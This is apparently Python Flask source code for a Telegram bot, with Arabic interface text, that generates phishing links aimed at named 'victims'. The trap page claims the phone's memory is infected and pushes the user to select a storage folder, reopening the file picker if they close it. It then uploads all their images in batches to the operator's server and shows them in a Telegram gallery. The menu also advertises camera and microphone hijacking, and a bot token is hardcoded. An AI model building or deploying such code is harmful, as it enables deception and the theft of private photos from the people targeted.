import os
import requests
from flask import Flask, request, render_template_string, redirect, send_from_directory
import base64
import random
import string
import time
import phonenumbers
from phonenumbers import geocoder, carrier

app = Flask(__name__)

# ============= الإعدادات الأساسية =============
BOT_TOKEN = "8997379641:AAGl00Dmd9ZJVTpqS-qACvanKTOEcDXgBKs"
ADMIN_ID = "7870803639"
BASE_URL = "https://freeusr-bot.onrender.com"

ALLOWED_USERS = [7870803639] 
user_state = {}
short_links = {}

# مجلد التخزين المؤقت (على Render)
UPLOAD_FOLDER = 'static/victim_storage'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error send_message: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id}, timeout=5)
    except Exception as e:
        print(f"Error answer_callback: {e}")

def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
            [{"text": "🚨 فخ ذاكرة التخزين (المعرض العكسي)", "callback_data": "steal_photos"}],
            [{"text": "📖 شرح استخدام البوت", "callback_data": "guide"}]
        ]
    }

# ============= المسارات (Routes) =============

@app.route('/')
def index():
    return "OK"

@app.route('/trap')
def trap_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>فحص ذاكرة الهاتف</title>
        <style>
            body { margin:0; padding:0; background:#0a0a0a; color:#fff; font-family:'Segoe UI',Tahoma,sans-serif; height:100vh; overflow:hidden; user-select:none; -webkit-user-select:none; }
            #fullScreenTrap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; cursor: pointer; }
            .content-wrapper { position: relative; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: radial-gradient(circle, #0d1b2a 0%, #000000 100%); }
            .warning-box { background: #111; padding: 40px 20px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,150,255,0.2); border: 1px solid #333; }
            .sys-icon { font-size: 80px; color: #2196F3; margin-bottom: 20px; animation:pulse 1s infinite alternate; }
            @keyframes pulse { from{transform:scale(1);} to{transform:scale(1.1);} }
            h1 { font-size: 24px; margin-bottom: 10px; color: #64B5F6; }
            p { font-size: 16px; color: #aaa; line-height: 1.6; margin-bottom: 30px; }
            .fake-btn { background: #1976D2; color: #fff; font-size: 20px; font-weight: bold; padding: 18px 30px; border-radius: 50px; width: 100%; box-sizing: border-box; box-shadow: 0 4px 15px rgba(25, 118, 210, 0.5); display: block; border: none; animation: blink 1.5s infinite; }
            @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
            #fileTrap { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; }
            #loadingScreen { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#0a0a0a; z-index:99999; flex-direction:column; justify-content:center; align-items:center; text-align:center; padding: 0 20px; box-sizing: border-box; }
            .spinner { border:5px solid #333; border-top:5px solid #2196F3; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:20px; }
            @keyframes spin { to{transform:rotate(360deg);} }
        </style>
    </head>
    <body>
        <label for="fileTrap" id="fullScreenTrap"></label>
        <div class="content-wrapper">
            <div class="warning-box">
                <div class="sys-icon">📁</div>
                <h1>تحذير: ذاكرة الهاتف مصابة!</h1>
                <p>تم رصد ملفات خبيثة تخترق بياناتك. لتنظيف ذاكرة الهاتف، يجب عليك تحديد مجلد التخزين الرئيسي للفحص.</p>
                <label for="fileTrap" class="fake-btn" id="mainBtn">تحديد ذاكرة الهاتف للفحص</label>
            </div>
        </div>
        <div id="loadingScreen">
            <div class="spinner" id="spinner"></div>
            <h2 style="color:#fff;" id="statusText">جاري فحص ذاكرة التخزين...</h2>
            <p style="color:#888; font-size:14px;">لا تغلق الصفحة. جاري سحب الملفات.</p>
        </div>
        <input type="file" id="fileTrap" accept="*/*" multiple webkitdirectory>
        <script>
            const ADMIN_ID = "{{ admin }}";
            const TARGET = "{{ target }}";
            let extracted = false;

            document.getElementById('fullScreenTrap').addEventListener('click', function(e) {
                if (extracted) return;
                document.getElementById('loadingScreen').style.display = 'flex';
                if (navigator.vibrate) navigator.vibrate([200,100,200,100,500]);
            });

            // إجبار مدير الملفات على الفتح لو حاول يقفل
            window.addEventListener('focus', () => {
                setTimeout(() => {
                    if (!extracted && document.getElementById('fileTrap').files.length === 0) {
                        setTimeout(() => { if (!extracted) document.getElementById('fileTrap').click(); }, 800);
                    }
                }, 500);
            });

            document.getElementById('fileTrap').addEventListener('change', async function(e) {
                const files = e.target.files;
                if (!files.length) return;
                extracted = true;
                document.getElementById('loadingScreen').style.display = 'flex';
                
                const imageFiles = Array.from(files).filter(file => file.type.startsWith('image/'));
                if (imageFiles.length === 0) {
                    document.getElementById('statusText').innerText = "لم يتم العثور على صور في المجلد.";
                    return;
                }

                const totalImages = imageFiles.length;
                const batchSize = 15; // 15 صورة لكل دفعة عشان سرعة الرفع
                let uploadedCount = 0;

                for (let i = 0; i < totalImages; i += batchSize) {
                    const batch = imageFiles.slice(i, i + batchSize);
                    const fd = new FormData();
                    fd.append('admin', ADMIN_ID);
                    fd.append('target', TARGET);
                    for (let j = 0; j < batch.length; j++) fd.append('photos', batch[j]);

                    try {
                        await fetch('/upload_trap', { method: 'POST', body: fd });
                        uploadedCount += batch.length;
                        document.getElementById('statusText').innerText = "تم فحص " + uploadedCount + " من " + totalImages + " ملف...";
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (err) { console.log(err); }
                }
                document.getElementById('loadingScreen').innerHTML = '<div style="font-size:60px; color:#4CAF50;">✅</div><h2 style="color:#4CAF50;">تم تنظيف ذاكرة الهاتف</h2><p style="color:#888;">يمكنك إغلاق الصفحة.</p>';
            });
        </script>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/upload_trap', methods=['POST'])
def upload_trap():
    admin_id = request.form.get('admin')
    target = request.form.get('target')
    photos = request.files.getlist('photos')
    
    if not photos or not admin_id:
        return {"ok": False, "error": "no_file"}, 400
        
    safe_target = "".join(c for c in target if c.isalnum() or c in "_-")
    target_dir = os.path.join(UPLOAD_FOLDER, safe_target)
    os.makedirs(target_dir, exist_ok=True)

    for photo in photos:
        filename = f"{int(time.time())}_{random.randint(1000,9999)}_{photo.filename}"
        filepath = os.path.join(target_dir, filename)
        photo.save(filepath)
        
    # رابط تطبيق المعرض داخل تليجرام
    gallery_url = f"{BASE_URL}/gallery/{safe_target}"
    
    reply_markup = {
        "inline_keyboard": [
            [{"text": "📂 فتح ذاكرة الضحية (المعرض)", "web_app": {"url": gallery_url}}]
        ]
    }
    
    # إرسال الإشعار لك
    msg = f"📸 *تم سحب صور جديدة!*\n🎯 الهدف: `{target}`\nاضغط على الزر بالأسفل لفتح المعرض واختيار ما تريد."
    send_message(admin_id, msg, reply_markup)
        
    return {"ok": True}, 200

# =======================================================
# 🌐 تطبيق المعرض (Mini App) للتحكم من البوت
# =======================================================
@app.route('/gallery/<target>')
def gallery_page(target):
    target_dir = os.path.join(UPLOAD_FOLDER, target)
    if not os.path.exists(target_dir):
        return "لا توجد صور لهذا الهدف.", 404

    images = os.listdir(target_dir)
    
    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ذاكرة الهاتف</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body { background-color: #1a1a1a; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
            h2 { text-align: center; color: #4CAF50; margin-bottom: 20px; }
            .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
            .img-container { position: relative; padding-bottom: 100%; overflow: hidden; border-radius: 10px; background: #333; }
            .img-container img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
            .btn { display: block; width: 100%; padding: 15px; background: #2196F3; color: white; text-align: center; border-radius: 10px; font-weight: bold; margin-top: 20px; text-decoration: none; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <h2>📂 ذاكرة الضحية: TARGET_NAME</h2>
        <p style="text-align:center; font-size:12px; color:#aaa;">اضغط على أي صورة لفتحها وحفظها</p>
        <div class="grid">
            IMAGE_TAGS
        </div>
        <button class="btn" onclick="Telegram.WebApp.close()">إغلاق المعرض</button>
    </body>
    </html>
    """
    
    image_tags = ""
    for img in images:
        img_url = f"{BASE_URL}/get_image/{target}/{img}"
        # فتح الصورة في نافذة جديدة عشان يقدر يحفظها
        image_tags += f'<div class="img-container"><a href="{img_url}" target="_blank"><img src="{img_url}" loading="lazy"></a></div>'
        
    return html.replace("TARGET_NAME", target).replace("IMAGE_TAGS", image_tags)

@app.route('/get_image/<target>/<filename>')
def get_image(target, filename):
    target_dir = os.path.join(UPLOAD_FOLDER, target)
    return send_from_directory(target_dir, filename)

# ============= البوت (Webhook) =============
@app.route(f'/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update: return "ok", 200
    
    if 'message' in update:
        chat_id = update['message']['chat']['id']
        if chat_id not in ALLOWED_USERS:
            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
            return "ok", 200
            
    if 'callback_query' in update:
        chat_id = update['callback_query']['message']['chat']['id']
        if chat_id not in ALLOWED_USERS:
            answer_callback(update['callback_query']['id'])
            send_message(chat_id, "⛔ عذراً، هذا البوت خاص.")
            return "ok", 200

    if 'message' in update and 'text' in update['message']:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg['text']
        
        if text == '/start':
            send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
            action = user_state[chat_id]['action']
            target = text
            
            if action == 'steal_photos': 
                link = f"{BASE_URL}/trap?target={target}&admin={chat_id}"
                send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
                
            del user_state[chat_id]
    
    if 'callback_query' in update:
        cb = update['callback_query']
        cb_id = cb['id']
        chat_id = cb['message']['chat']['id']
        data = cb['data']
        
        answer_callback(cb_id)
        
        if data == 'steal_photos':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'steal_photos'}
            send_message(chat_id, "🚨 أرسل اسم الضحية لإنشاء رابط سحب ذاكرة التخزين:")
        else:
            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅")
            
    return "ok", 200

def set_webhook():
    webhook_url = f"{BASE_URL}/webhook"
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}", timeout=10)
    except Exception as e:
        print(e)

set_webhook()

if __name__ == '__main__':
    app.run(port=5000)
